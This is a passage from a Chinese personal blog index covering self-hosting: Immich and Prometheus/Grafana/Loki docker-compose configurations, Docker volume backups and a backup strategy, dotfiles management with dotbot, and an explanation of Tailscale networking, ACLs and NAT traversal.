immich-web: image: altran1502/immich-web:release entrypoint: [\u0026#34;/bin/sh\u0026#34;, \u0026#34;./entrypoint.sh\u0026#34;] env_file: - .env environment: # Rename these values for svelte public interface - PUBLIC_IMMICH_SERVER_URL=${IMMICH_SERVER_URL} restart: always labels: - traefik.enable=true - traefik.http.routers.immich-web.rule=Host(`ninja.tailnet-48a5.ts.net`) - traefik.http.routers.immich-web.entrypoints=immich - traefik.http.services.immich-web.loadbalancer.server.port=3000 使用独立容器网络 # Immich 服务涉及的容器比较多，比较好的做法是统一放在一个独立的容器网络内：\nnetworks: default: external: true name: immich 但同时，根据上面的配置不难发现 immich-server 和 immich-web 两个容器需要和 Traefik 容器互通，也就是要加入 lab 网络，因此可以这样设置：\nversion: \u0026#34;3\u0026#34; services: immich-server: image: altran1502/immich-server:release entrypoint: [\u0026#34;/bin/sh\u0026#34;, \u0026#34;./start-server.sh\u0026#34;] networks: - lab - default # ... immich-web: image: altran1502/immich-web:release entrypoint: [\u0026#34;/bin/sh\u0026#34;, \u0026#34;./entrypoint.sh\u0026#34;] networks: - lab - default # ... networks: default: external: true name: immich lab: external: true name: lab # ... 如果在上面 Traefik 的静态配置中没有指定 provider.docker.network 为 lab，那么 Traefik 就有可能将流量转发到 immich-server 和 immich-web 在 immich 网络上的网卡上，显然不可能成功。\n配置完成后的 Immich 服务架构图：\n已知问题 # 按时间线浏览时可能会出现中间较大一片空白的问题，刷新后消失 备份 # 部署配置备份：主要是 .env 文件，在 compose 备份中完成 目前 Immich 应用配置十分简单，无需备份 照片备份：我们可以设置 ${UPLOAD_LOCATION} 使得照片文件同样位于 AList 本地存储根目录下，这样就能在 AList 文件备份中完成 同类服务 # PhotoPrism Photoview 相关资料：\nImmich 官方文档 Immich Issue #765 Immich Discussions#437 监控与日志分析 - Prometheus+Grafana+Loki # 为了能对系统状态以及容器状态进行更细粒度的监控和分析，我们可以使用 Prometheus+Grafana+Loki 生态，方便数据可视化和日志集中分析。\nDocker Compose 部署 # 首先部署 Prometheus，同时使用 Node Exporter 输出系统状态信息，用 cAdvisor 输出容器状态信息，注意后两者都需要挂载一些特殊目录才能正常获取数据。\nversion: \u0026#34;3\u0026#34; services: prometheus: image: prom/prometheus:latest container_name: prometheus restart: always networks: - lab - monitoring volumes: - $PWD/prometheus.yml:/etc/prometheus/prometheus.yml:ro - prometheus_data:/prometheus command: - --config.file=/etc/prometheus/prometheus.yml - --storage.tsdb.path=/prometheus - --web.console.libraries=/etc/prometheus/console_libraries - --web.console.templates=/etc/prometheus/consoles - --web.enable-lifecycle labels: - traefik.enable=true - traefik.http.routers.prometheus.rule=Host(`ninja.tailnet-48a5.ts.net`) - traefik.http.routers.prometheus.entrypoints=prometheus - traefik.http.services.prometheus.loadbalancer.server.port=9090 node-exporter: image: prom/node-exporter:latest container_name: node-exporter restart: always networks: - monitoring volumes: - /proc:/host/proc:ro - /sys:/host/sys:ro - /:/rootfs:ro command: - --path.procfs=/host/proc - --path.rootfs=/rootfs - --path.sysfs=/host/sys - --collector.filesystem.mount-points-exclude=^/(sys|proc|dev|host|etc)($$|/) cadvisor: image: gcr.io/cadvisor/cadvisor:latest container_name: cadvisor restart: always networks: - monitoring volumes: - /:/rootfs:ro - /var/run:/var/run:ro - /sys:/sys:ro - /var/lib/docker/:/var/lib/docker:ro networks: monitoring: lab: external: true volumes: prometheus_data: 这里的 gcr.io/cadvisor/cadvisor 由于镜像仓库在国内被墙，可以使用国内镜像下载后用 docker tag 修改一下镜像标签。和之前类似，我们依然给这三个服务设立一个单独的网络 monitoring ，并暴露 prometheus 服务本体到 lab 网络。实际上，由于后面会使用 Grafana 查看 Prometheus 的数据，不暴露 prometheus 服务也是可以的。\n挂载的 Prometheus 配置文件中，我们可以采集 Prometheus 自身、Node Exporter 以及 cAdvisor 三个服务的数据：\nglobal: scrape_interval: 1m scrape_configs: - job_name: \u0026#34;prometheus\u0026#34; static_configs: - targets: [\u0026#34;localhost:9090\u0026#34;] - job_name: \u0026#34;node\u0026#34; static_configs: - targets: [\u0026#34;node-exporter:9100\u0026#34;] - job_name: \u0026#34;cadvisor\u0026#34; static_configs: - targets: [\u0026#34;cadvisor:8080\u0026#34;] 注意 Docker Compose 中使用 prometheus_data 持久化了 Prometheus 的数据，使得容器重启不会丢数据，也更方便后续备份。这一点对于 Grafana 也同理：\nversion: \u0026#34;3\u0026#34; services: grafana: image: grafana/grafana-oss:latest container_name: grafana restart: always networks: - lab - loki volumes: - grafana_data:/var/lib/grafana labels: - traefik.enable=true - traefik.http.routers.grafana.rule=Host(`ninja.tailnet-48a5.ts.net`) - traefik.http.routers.grafana.entrypoints=grafana - traefik.http.services.grafana.loadbalancer.server.port=3000 loki: image: grafana/loki:latest container_name: loki restart: always networks: - loki volumes: - $PWD/loki-config.yml:/etc/loki/config.yml:ro command: -config.file=/etc/loki/config.yml healthcheck: test: [ \u0026#34;CMD-SHELL\u0026#34;, \u0026#34;wget --no-verbose --tries=1 --spider \u0026lt;http://localhost:3100/ready\u0026gt; || exit 1\u0026#34; ] interval: 10s timeout: 5s retries: 5 promtail: image: grafana/promtail:latest container_name: promtail restart: always networks: - loki volumes: - $PWD/promtail-config.yml:/etc/promtail/config.yml:ro - /var/run/docker.sock:/var/run/docker.sock:ro command: -config.file=/etc/promtail/config.yml networks: loki: lab: external: true volumes: grafana_data: Promtail 会负责收集容器的日志并发送给 Loki，Loki 可以对日志进行分析和查询并通过 Grafana 展示出来。Grafana 同时也可以展示 Prometheus 各个 metrics 的查询结果，或是更直观地通过 Dashboard 来展示重要的 metrics 绘制成的图表。\n这里挂载的两个配置文件需要在官网提供的配置文件上根据自己的需求进行修改，例如 Loki 的配置中我们额外设置了 limits_config 来解决启动后关于时间戳和流限速的报错：\nauth_enabled: false server: http_listen_port: 3100 grpc_listen_port: 9096 common: path_prefix: /tmp/loki storage: filesystem: chunks_directory: /tmp/loki/chunks rules_directory: /tmp/loki/rules replication_factor: 1 ring: instance_addr: 127.0.0.1 kvstore: store: inmemory query_range: results_cache: cache: embedded_cache: enabled: true max_size_mb: 100 schema_config: configs: - from: 2020-10-24 store: boltdb-shipper object_store: filesystem schema: v11 index: prefix: index_ period: 24h limits_config: reject_old_samples: false per_stream_rate_limit: 5M # ... analytics: reporting_enabled: false Promtail 的配置如下，需要确保能与 Loki API 通信且能访问 Docker Socket（因为我们主要收集容器化服务的日志），并重命名一些我们需要的 label 来简化查询：\nserver: http_listen_port: 9080 grpc_listen_port: 0 positions: filename: /tmp/positions.yaml clients: - url: \u0026lt;http://loki:3100/loki/api/v1/push\u0026gt; scrape_configs: - job_name: container_scrape docker_sd_configs: - host: unix:///var/run/docker.sock refresh_interval: 5s relabel_configs: - source_labels: [\u0026#39;__meta_docker_container_name\u0026#39;] regex: \u0026#39;/(.*)\u0026#39; target_label: \u0026#39;container\u0026#39; 之后就是配置 Grafana Dashboard 了。由于这一生态功能非常强大，其配置和查询语法也异常复杂，超出了本文讨论的范围。\n备份 # 配置文件备份：在 compose 备份中完成 如有必要，可以备份 Docker Volume 同类服务 # Glances Netdata ELK Stack 相关资料：\nPrometheus 官方文档 vegasbrianc/prometheus Grafana 官方文档 Loki Issues#1923 Loki/Promtail : parsing timestamp that are too old Loki 官方文档 备份 Docker Volume # 我们以 Uptime Kuma 为例来介绍如何方便地备份和恢复 Docker Volume。根据 官方文档中的说明 我们可以启动一个临时的容器、挂载要备份的 Volume、挂载当前目录到 /backup，最后打包 Volume 对应的目录到 /backup ：\n$ docker run --rm --volumes-from \u0026lt;container_name\u0026gt; -v $(pwd):/backup alpine tar zcvf /backup/backup.tar.gz \u0026lt;volume_mount_dir\u0026gt; 在 Uptime Kuma 这个例子里就是：\n$ docker run --rm --volumes-from uptime-kuma -v $(pwd):/backup alpine tar zcvf /backup/backup.tar.gz /app/data 恢复也是类似的，假设我们的新容器是 uptime-kuma-ng，同样挂载了一个 Volume 到 /app/data。此时可以启动一个临时容器、挂载 uptime-kuma-ng 的 Volume、挂载当前目录到 /backup，再将当前目录下的备份包 backup.tar.gz 解压到 /app/data 下就可以了：\n$ docker run --rm --volumes-from uptime-kuma-ng -v $(pwd):/backup alpine /bin/sh -c \u0026#34;cd /app/data \u0026amp;\u0026amp; tar zxvf /backup/backup.tar.gz --strip 1\u0026#34; 备份方案 # 3-2-1 原则 # 备份时我们可以遵循 3-2-1 原则，即：\n保存 3 份数据的副本 使用 2 种不同的存储介质 至少 1 份副本保存在异地 这样的备份方案对于普通人而言已经将风险降到了很低的水平，同时实践起来也较为容易。但出于成本和时间考量，我们其实没有必要对所有的数据都进行 3-2-1 备份，许多数据可能并没有我们想象的那么重要。因此，在备份前首先要对数据进行分级。\n数据分级 # 我采用顶层目录作为分级的主要单元、二级目录作为最小单元，这主要是出于个人的思维习惯，并不一定算得上是好的方案。换句话说，在这种方案里数据被分成一个个顶层目录，其中一部分是被分成一个个二级目录，这样我们根据目录名能大致判断目录下的内容，不必关心更底层的目录里有些什么。除了符合思维习惯、更便于定位和管理文件外，这样做的另一大好处是：我们在划分目录时的依据一般是目录下文件的内容，许多情况下同一类别的内容的备份需求是一致的；当然，也存在不一致的情况，这就是这种方法的坏处了。\n备份需求 # 接下来，我们考虑不同目录的备份需求差异。我这里将备份需求划分为三个维度：\nImportance，数据的重要性，即我们在多大程度上不希望这些数据丢失 Privacy，数据的隐私性，即我们在多大程度上不希望这些数据被他人读取 Locality，数据的局部性，即我们在主力机上对这些数据的读写频率 对于前两个指标，可以划分三个档次；而局部性则可以简单分为经常读写和不常读写两档。对不同的备份需求，我们可以采取不同的备份策略。首先是重要性，下面提到的本地和远程意同离线和在线：\n重要性低的数据，我们可以只保留 1 份副本（即不备份），可以在本地也可以在远程 重要性中等的数据，我们可以保留 2 份副本，1 份在本地、1 份在远程 重要性高的数据，我们需要保留 3 份副本，2 份在本地、1 份在远程；或是 3 份在本地，其中 1 份需要有类似异地容灾的能力 一个判断重要性的方法是看再次获得这些数据的难度。软件的安装包通常都能在互联网上下载得到，因此重要性很低（实际上不应备份）；而一些已经在网络上绝版的文章，由于无法再次获得，重要性就很高了。\n接着是隐私性：\n隐私性低的数据，建议上传到远程，且上传时也无需加密 隐私性中等的数据，上传到远程时建议加密 隐私性高的数据，建议不上传到远程，如果上传到远程则必须加密 判断隐私性高低其实并不容易。我们当然不希望自己的生活照被他人看到，但显然导出的密码库或是身份证扫描件这类文件对隐私性的要求会高得多。我们可以从攻击者的角度，根据数据泄露的危害来判断数据隐私性的高低：如果我是攻击者，拿到了别人的这些数据，我能用它来做什么？\n对于隐私性低或中等的数据，在上传时是否加密可以根据对云存储服务商的信任程度决定。此外需要强调的是，加密不仅可以防止数据被窃取，还可以用来避免审查。如果使用国内服务商，建议对所有上传的数据均进行加密。加密时必须使用强加密算法并确保足够的密钥长度，且对每个不同的数据单元采用不同的密钥。\n随后是局部性：\n不常读写的数据，可以采用备份盘的形式，即不定期手动将数据更新到其他副本 经常读写的数据，可以采用同步盘的形式，通过软件自动在副本之间同步数据 Apple 生态下的 iCloud 是一个很方便的同步盘，Syncthing 则提供了类似的方案。此外，WebDAV 协议也能协助我们更方便地读写数据。\n最后需要注意对云端的所有数据都应存在至少 1 份本地备份，避免给予云存储过多信任。除了倒闭之外，传输过程中的数据损坏、服务商的协议和政策调整同样是很大的威胁。\nHomelab 目前已知问题 # 由于只能内网访问，几乎没有考虑安全性 移动设备访问服务需要开启 Tailscale 的 VPN，与梯子的 VPN 冲突，目前只能手动切换 URL 中存在非标准端口号，不够友好 备份方案依然有优化空间 Why not \u0026hellip;? # 影音、BT 下载相关软件：习惯在线播放，没有需求 Paperless-ngx：文档管理，适合配合打印机扫描功能使用、或需要在大量英文文献中快速查找内容时使用（如科研场景），暂时没有这两类需求；采用标签而不是传统目录结构管理文献，不太习惯，且会导致迁移困难 CyberChef：编码解码工具箱，由于在线版本同样是纯前端交互，不必担心隐私、负载或是账号问题；更新比较频繁，私有部署需要及时同步，不太方便 Duplicati：备份工具，和 AList + Syncthing 方案功能重叠了；有可能提供更好的备份方案，之后优化备份时再考虑 PhotoPrism：照片管理，功能远超我的需求，对服务器负载影响可能较大，可被 Immich 替代 Adguard Home：DNS 级广告过滤，适合家用（能控制路由器、设备较多）；需要较复杂的过滤规则、DNS 设置，暂时没有精力研究；可能出现误杀情况；可能略微增加延迟 Gotify：推送通知，需要安装手机应用，不够方便；不如 Telegram Bot Authentik/Authelia：SSO，由于目前部署的应用中只有少部分能集成，且内网中部署收益不大，暂不部署 总结 # 部署私有服务是一件很有意思的事，但如果没有采用合理的手段进行维护，后续对各类服务的管理会很痛苦。前几天阅读了一篇 Selfhosting lessons learned from over the years\u0026hellip;，其中的经验也的确是我在部署过程中有切身体会的：\n简化配置：复杂的各类设置和 hack 技巧可能的确有用，但在几个月后进行维护的时候一定会让人头疼。复杂的设置往往需要高质量的文档，而简单的设置只需要一些简单的注释和链接就足够了。 没必要用企业硬件：老旧 CPU和功耗使得这一选项不太明智，不如购买更新、更低功耗的主机。 记录笔记、文档、在配置文件中写注释：不用多说，给未来的自己提供方便。 网上的教程良莠不一：在中文互联网上这种情况更为突出，最好的方法是阅读官方文档，教程只能作为参考使用，甚至很有可能已经过时了。 尽可能把所有服务放在防火墙/VPN后面：将服务暴露在公网不仅需要我们进行详尽的安全配置，还需要及时更新服务、了解 0-day 漏洞等等，非常耗费精力。 反向代理很有用：在上文已经介绍了，反向代理能极大方便我们部署和管理多个服务，以及处理那些和证书相关的麻烦事。 搭建服务是为了有用而不是好玩：许多服务搭建起来可能就是吃灰，但服务搭建的越多维护成本就越高，应尽量精简服务，留下那些真正有用的。 备份：建立完备的备份方案，最好能在 Homelab 之外的地方（设备/物理位置）也有备份，主要备份的内容有配置文件、数据库、笔记和文档、系统快照等。 掌控自己的数据，自然需要付出相应的精力和成本。\n","date":"2022-12-30","permalink":"/posts/selfhosting/","section":"Posts","summary":"\u003cp\u003e最近几天在搭建 Homelab 上花费了不少精力，因此想要一边试错一边记录下这个过程。\u003c/p\u003e","title":"私有部署：打造自己的 Homelab"},{"content":"","date":"2022-12-30","permalink":"/categories/%E6%8E%A2%E7%B4%A2/","section":"Categories","summary":"","title":"探索"},{"content":"","date":"2022-12-30","permalink":"/tags/%E7%BD%91%E7%BB%9C/","section":"Tags","summary":"","title":"网络"},{"content":"","date":"2022-10-24","permalink":"/tags/linux/","section":"Tags","summary":"","title":"Linux"},{"content":"","date":"2022-10-24","permalink":"/categories/%E8%87%AA%E5%8A%A8%E5%8C%96/","section":"Categories","summary":"","title":"自动化"},{"content":"面对一台新的 Linux 机器时，不用为了重搭环境头疼了。\n背景 # 我们在拿到一台新的 Linux 机器（物理机、虚拟机、云服务器、Docker 等）时，往往会有些束手无策，因为我们平时所习惯的环境在这台机器上都还没有配置，最典型的莫过于 zsh 以及相应的主题和插件。幸运的事，许多命令行工具都会提供一个以 . 开头的配置文件，我们将配置写入其中，就可以把配置文件传到新机器里来实现对该工具的统一配置。\n然而，这种做法存在诸多缺陷：\n对于每一台新机器，都需要手动传配置文件过去 对于每一种需要使用的工具，都需要管理一份对应的配置文件，不同工具的配置文件路径可能千差万别 配置文件更新后，需要再次传输，缺少同步机制 配置文件更新出错后无法回滚，即缺少修改历史信息 系统不自带的工具依然需要重复输入相同的命令进行安装 为了解决以上问题，我们可以创建一个 dotfiles 仓库用于统一存放我们的配置文件，并为这个仓库加上版本控制。为了让这些配置文件能方便地生效并安装一些其他工具，我们引入 dotbot 来实现对 dotfiles 的管理。\n开始上手 # 我们可以使用 init-dotfiles 脚本自动生成 dotfiles 仓库，其中包含了一个名称为 dotbot 的 git submodule。随后就可以在仓库内编写 dotfiles 了，为了和真正的配置文件区别并方便查看，可以去掉开头的 .，例如在 zshrc（而不是 .zshrc）中编写 zsh 配置，随后用软链接来链接到配置文件的默认位置。\n我们不修改工具读取配置文件的位置，主要是因为修改方式因工具而异，不利于自动化。因此，全部采用默认的配置文件位置，然后在 install.conf.yaml 中设置软链接的映射：\n- link: ~/.config: ~/.shell: ~/.gitconfig: ~/.npmrc: ~/.ssh/config: ssh_config ~/.tmux.conf: ~/.vimrc: ~/.yarnrc: ~/.zshrc: 不填时则默认映射到去除开头 . 的文件，如 ~/.zshrc 映射到 zshrc。以上面的配置为例，dotfiles 仓库下的 ssh_config 文件会软链接到 ~/.ssh/config。\n简单配置 # 设置了映射后，我们可以对 dotbot 进行进一步配置，例如 defaults.link.create 可以在目标文件不存在时自动创建文件，而 defaults.link.relink 则可以自动删除已经存在的目标文件并重新进行软链接。因为这些值在 defaults 下，所以我们可以在 link 下的每一项里单独覆盖掉这些值。clean 则会自动删除指定目录下的无效软链接。这种设计使得 dotbot 可以多次运行而不出现问题，即确保了幂等性。\n- defaults: link: create: true relink: true - clean: [\u0026#39;~\u0026#39;] 安装工具 # 我们还可以设置 dotbot 运行时需要额外运行的命令，默认命令是：\n- shell: - [git submodule update --init --recursive, Installing submodules] 这样可以确保 dotbot 是最新的。接下来我们就可以自己编写脚本放到这里：\n- shell: - [git submodule update --init --recursive, Installing submodules] - command: ~/.dotfiles/scripts/all.sh stdout: true description: Preparing dev environment 注意在 shell 脚本（非交互式环境）中使用别名需要运行 shopt -s expand_aliases 来扩展别名。\ndotbot 还支持更多细粒度的配置，可以参考 dotbot 的 README。\n差异化配置 # 有时，我们希望一个工具的一部分配置是在各个机器上通用的，而另一部分配置仅对本机适用。此时我们需要将配置文件分为两个文件，例如像这样在 zshrc 末尾添加：\n# Allow local customizations in the ~/.zshrc_local file if [ -f ~/.zshrc_local ]; then source ~/.zshrc_local fi 这样 zshrc 中的内容是通用的，而 ~/.zshrc_local 中的内容则只会在本地生效。同理，对于 ssh_config 而言，我们可以在开头包含一个本地的配置文件：\nInclude ~/.ssh/config_local 此时 ssh_config 中的内容是通用的，而 ~/.ssh/config_local 中的内容只在本地生效。\n另外，由于有时我们会软链接整个目录，有些工具会在目标目录中创建配置文件从而使得我们的版本控制中也出现这些配置文件。例如，当 macOS 和 Linux 共用一套 dotfiles 时，显然 ~/.config/iTerm2 是 Linux 无需关心的配置文件，此时可以将这些目录加入 .gitignore。\n运行 dotbot # 在完成了配置以后，我们就可以在新机器上通过简单的命令来搭建环境了：\n$ git clone https://github.com/SignorMercurio/dotfiles.git $ mv dotfiles .dotfiles $ .dotfiles/install 得益于版本控制的存在，我们可以方便地查看/回滚历史、以及在不同机器上同步配置。因为软链接的特性，在更新配置文件时只需要更新 dotfiles 仓库内的配置文件而无需关心配置文件的实际位置。而由于运行 dotbot 的幂等性，即使添加新配置文件也只需要再次运行 install，十分方便。\n","date":"2022-10-24","permalink":"/posts/dotfiles/","section":"Posts","summary":"\u003cp\u003e面对一台新的 Linux 机器时，不用为了重搭环境头疼了。\u003c/p\u003e","title":"自动装弹：快速搭建通用命令行环境"},{"content":"组建自己的私有零信任网络。\n最近对搭建自己的组网产生了兴趣，综合考虑安全性、可用性、速度和易用性选择了 Tailscale 作为解决方案。为了更深入地理解 Tailscale 的原理，对参考资料中的两篇介绍进行了简单翻译与概括。\n数据面 # Hub-and-spoke 架构 # Tailscale 底层采用 WireGuard 在节点间构建轻量的加密隧道。包括 WireGuard 在内的传统 VPN 采用 Hub-and-spoke 的中心化架构，节点必须连接到一个 VPN 网关才能与网络中其他节点通信。这样的架构比较简单，但每个节点必须知道其他节点的信息，如公钥、公网 IP、端口号等等。节点数增多后，节点需要存储的信息也会骤然增多。\n同时，VPN 网关也成为了系统中的一个单点，容易面临单点故障。而如果源节点和目标节点都离 VPN 网关很远，但两者本身距离很近，那么必须经过 VPN 网关的机制就引入了不必要的延迟。\nWireGuard 通过将 VPN 网关拆分到多个不同位置的机器上来解决这一问题，但这也使得加入新节点时需要将密钥分别分发到这些机器上。\nPeer-to-peer 通信 # 尽管如此，这一架构下并不能实现 peer-to-peer 的通信。我们可以在每两个节点间建立隧道，但这样会让隧道数量成倍增长。例如，对于一个 10 个节点的网络，就需要 10x(10-1)/2=45 条隧道，并且每个节点依然要管理其他所有节点的信息。\n况且，节点不一定能拥有一个静态的 IP，也不一定能控制它所处的网络的防火墙以打开端口。对节点间流量的审计也变得不可能了。\n控制面 # Tailscale 则通过一个中心化的控制面来解决上述问题。我们稍后讨论 NAT 穿透的问题，因此先假设所有节点都有静态 IP 而且能自由打开防火墙端口。\n密钥分发 # 首先是密钥如何分发的问题。Tailscale 在节点上安装的客户端会与中心化的 Tailscale 协调服务器通信，但和 Hub-and-spoke 架构不同，这一中心化架构仅仅是对控制面而言的，并不传输实际的数据。换而言之，控制面是中心化的而数据面是去中心化的。\n节点生成自己的密钥对后，将公钥以及自己的信息提交给协调服务器，并从那里下载别人的公钥和信息。注意私钥是不会离开节点的，这保证了没有人可以获取节点的私钥从而伪装成这个节点。节点间通信时，发送方直接使用接收方的公钥加密消息，实现端到端加密。\n节点认证 # 协调服务器也需要认证节点，随后才能发送公钥给它。这里的认证可以用预共享的密钥（也就是传统的用户名/密码机制）、预先颁发的“设备证书”、多因素认证以及基于 OAuth2/OIDC/SAML 的 SSO。\nDERP # 然而，之前假设所有节点都有静态 IP 而且能自由打开防火墙端口毕竟过于理想化，现实中的节点常常位于 NAT + 防火墙后面。Tailscale 采用了基于 STUN 和 ICE 标准的 UDP 打洞技术来在这些节点间建立连接。但也有一些防火墙直接屏蔽了 UDP，此时 Tailscale 提供了一种基于 TCP 的 Fallback 机制，称为 DERP（Designated Encrypted Relay for Packets）。DERP 服务器分布在世界各地，用来作为公网中转使得两台机器能够通信，这就和传统的利用公网服务器的内网穿透原理类似了。由于流量用节点私钥才能解密，DERP 服务器只能中转流量，无法解密流量。实际上，DERP 服务器的实现相当简单。\n其他功能 # Tailscale 还支持设置全局的 ACL 和流量审计功能，这都是因为其中心化的控制面的存在。子网路由功能则让已连接的节点成为 VPN 网关（此时是 Hub-and-spoke 架构），让其同网段的其余机器也能被其他节点访问，使得增量部署成为可能。\n例如，在我的组网中将设备分为 trusted、server 和 untrusted 三类，利用 ACL Tags 区分。我设定了 trusted 设备可以访问任意设备的任意端口；server 设备可以访问其他 server 设备的任意端口、以及 trusted 设备的应用端口；untrusted 设备可以访问 trusted 设备和 server 设备的应用端口。并且，还可以添加测试用例来确保 ACL 规则设置符合预期。\n{ \u0026#34;tagOwners\u0026#34;: { \u0026#34;tag:trusted\u0026#34;: [\u0026#34;SignorMercurio@github\u0026#34;], \u0026#34;tag:server\u0026#34;: [\u0026#34;SignorMercurio@github\u0026#34;], \u0026#34;tag:untrusted\u0026#34;: [\u0026#34;SignorMercurio@github\u0026#34;] }, \u0026#34;acls\u0026#34;: [ // Match absolutely everything. // Comment this section out if you want to define specific restrictions. // {\u0026#34;action\u0026#34;: \u0026#34;accept\u0026#34;, \u0026#34;src\u0026#34;: [\u0026#34;*\u0026#34;], \u0026#34;dst\u0026#34;: [\u0026#34;*:*\u0026#34;]}, // Trusted devices can access everything. { \u0026#34;action\u0026#34;: \u0026#34;accept\u0026#34;, \u0026#34;src\u0026#34;: [\u0026#34;tag:trusted\u0026#34;], \u0026#34;dst\u0026#34;: [\u0026#34;*:*\u0026#34;] }, // Server can access other servers. { \u0026#34;action\u0026#34;: \u0026#34;accept\u0026#34;, \u0026#34;src\u0026#34;: [\u0026#34;tag:server\u0026#34;], \u0026#34;dst\u0026#34;: [\u0026#34;tag:server:*\u0026#34;] }, // Server can access user applications on trusted devices. { \u0026#34;action\u0026#34;: \u0026#34;accept\u0026#34;, \u0026#34;src\u0026#34;: [\u0026#34;tag:server\u0026#34;], \u0026#34;dst\u0026#34;: [\u0026#34;tag:trusted:80,443,1024-65535\u0026#34;] }, // Untrusted devices can access user applications on trusted devices and servers. { \u0026#34;action\u0026#34;: \u0026#34;accept\u0026#34;, \u0026#34;src\u0026#34;: [\u0026#34;tag:untrusted\u0026#34;], \u0026#34;dst\u0026#34;: [\u0026#34;tag:trusted:80,443,1024-65535\u0026#34;, \u0026#34;tag:server:80,443,1024-65535\u0026#34;] } ], \u0026#34;tests\u0026#34;: [ { \u0026#34;src\u0026#34;: \u0026#34;tag:trusted\u0026#34;, \u0026#34;accept\u0026#34;: [ \u0026#34;tag:trusted:22\u0026#34;, \u0026#34;tag:trusted:80\u0026#34;, \u0026#34;tag:trusted:443\u0026#34;, \u0026#34;tag:trusted:8080\u0026#34;, \u0026#34;tag:server:22\u0026#34;, \u0026#34;tag:server:80\u0026#34;, \u0026#34;tag:server:443\u0026#34;, \u0026#34;tag:server:8080\u0026#34;, \u0026#34;tag:untrusted:22\u0026#34;, \u0026#34;tag:untrusted:80\u0026#34;, \u0026#34;tag:untrusted:443\u0026#34;, \u0026#34;tag:untrusted:8080\u0026#34; ] }, { \u0026#34;src\u0026#34;: \u0026#34;tag:server\u0026#34;, \u0026#34;accept\u0026#34;: [ \u0026#34;tag:server:22\u0026#34;, \u0026#34;tag:server:80\u0026#34;, \u0026#34;tag:server:443\u0026#34;, \u0026#34;tag:server:8080\u0026#34;, \u0026#34;tag:trusted:80\u0026#34;, \u0026#34;tag:trusted:443\u0026#34;, \u0026#34;tag:trusted:8080\u0026#34; ], \u0026#34;deny\u0026#34;: [ \u0026#34;tag:trusted:22\u0026#34;, \u0026#34;tag:untrusted:22\u0026#34;, \u0026#34;tag:untrusted:80\u0026#34;, \u0026#34;tag:untrusted:443\u0026#34;, \u0026#34;tag:untrusted:8080\u0026#34; ] }, { \u0026#34;src\u0026#34;: \u0026#34;tag:untrusted\u0026#34;, \u0026#34;accept\u0026#34;: [ \u0026#34;tag:trusted:80\u0026#34;, \u0026#34;tag:trusted:443\u0026#34;, \u0026#34;tag:trusted:8080\u0026#34;, \u0026#34;tag:server:80\u0026#34;, \u0026#34;tag:server:443\u0026#34;, \u0026#34;tag:server:8080\u0026#34; ], \u0026#34;deny\u0026#34;: [ \u0026#34;tag:trusted:22\u0026#34;, \u0026#34;tag:server:22\u0026#34;, \u0026#34;tag:untrusted:22\u0026#34;, \u0026#34;tag:untrusted:80\u0026#34;, \u0026#34;tag:untrusted:443\u0026#34;, \u0026#34;tag:untrusted:8080\u0026#34; ] } ] } 2022.12 更新：由于 Taildrop 功能目前仅限于在同一 User 的机器之间使用，需要使用 Taildrop 的设备（我的组网中是所有 tag:trusted 设备）必须去掉 ACL Tag 并重新登录，使其归属于同一 User。最后，只需要将上面的 ACL 规则中的 tag:trusted 修改为用户全名即可。\nNAT 穿透 # 接下来详细讨论 Tailscale 如何实现 NAT 穿透。要解决的问题是：让两台位于 NAT + 防火墙后的机器在无法控制防火墙的情况下能够互相通信。\n背景 # 我们采用 UDP 协议进行 NAT 穿透，主要是由于 TCP 协议的复杂性会让 NAT 穿透问题进一步复杂化。如果考虑 TCP 是因为想要面向字节流的连接，那么同样基于 UDP 的 QUIC 协议就是一个很好的选择。\n随后，一个必要条件是能够直接控制收发网络包的 socket。这是因为上层协议本身并不处理 NAT 穿透，处理 NAT 穿透的应该是一个独立的网络层协议。这可以通过一个本地代理实现，应用程序与代理通信，代理来处理 NAT 穿透和包传递的问题，这样应用程序里的协议就不用更改。\n满足必要条件后，要解决最开始提出的问题就只需要关心两点障碍，即有状态防火墙和 NAT 设备。\n防火墙 # 防火墙问题比较好解决，而且 NAT 设备通常都自带一个有状态防火墙，所以对付 NAT 前总得先解决这个问题。\n放行规则 # 通常防火墙的默认配置是阻止所有传入连接、允许所有传出连接，在这一基础上可能会添加一些额外规则，比如允许传入 SSH 连接。\n但所谓的“传入”和“传出”只是为了易于理解，我们知道实际上所有连接都是双向的，仅仅单向地传递数据而收不到响应没有意义。对防火墙而言，看到的无非是飞来飞去的数据包，那它怎么知道哪些是“传入”的、哪些是“传出”的呢？\n这就是“有状态”的含义，防火墙会记住过去看到过的包，以此为依据判断如何处理新的包。对 UDP 来说，对于一个传入的包，如果之前出现过对应的传出的包，那么就可以放行。比如防火墙看到一个从 2.2.2.2:1234 到 7.7.7.7:5678 的包，那么会记住从 7.7.7.7:5678 到 2.2.2.2:1234 的包也是可以放行的。\n有些宽松的防火墙一旦看到从 2.2.2.2:1234 传出的包，就会允许任意传入 2.2.2.2:1234 的包，这使得 NAT 穿透变得很容易。但这种情况很少见。\n这个规则使得防火墙后的设备要想和别人建立连接，必须得自己先发起连接。因此传统 VPN 采用的是 Hub-and-spoke 架构，防火墙后的机器主动连到 VPN 网关上。而如果通信双方是两个防火墙后的设备，那么任意一方发起的连接就都会被另一方的防火墙阻止。\n利用放行规则 # 绕过这一限制也很简单，前面提到：防火墙看到一个从 2.2.2.2:1234 到 7.7.7.7:5678 的包，就会放行从 7.7.7.7:5678 到 2.2.2.2:1234 的包，这里的原因是因为前一个是请求而后一个通常是响应，为了正常交互要允许响应包通过。但并没有规定说后一个包必须是响应！因此，即使 2.2.2.2:1234 发送的包根本没有到达 7.7.7.7:5678，后者也可以发送一个看起来像响应的包回去，并且能通过防火墙。此时，对于 7.7.7.7 的防火墙而言，因为有传出的 7.7.7.7:5678 到 2.2.2.2:1234 的包，所以 2.2.2.2:1234 到 7.7.7.7:5678 的包也可以放行了，双向连接成功建立。\n时间同步 # 需要注意的是，这个方法要求两边必须在差不多的时间向对端发起连接，而要在“差不多的时间”上达成一致，就需要两边能够进行某种通信，这样就形成了一个循环。因此，我们必须使用 out-of-band 的方式建立信道来传输数据，而在 Tailscale 里则是由协调服务器和 DERP 服务器来完成。并且，两边需要每隔一段时间重新发送包，来防止防火墙关闭对应的端口放行规则。但我们不必担心中间有多少防火墙，因为只要发起连接的时间相差不多，任意多的防火墙都会放行对应的包。\n对端地址 # 可以发现，我们必须知道通信对端使用的 IP:port，这就是中心化的 Tailscale 协调服务器的事了。不过，由于 NAT 的存在，获取对端的 IP:port 没那么容易。\nNAT 设备 # NAT 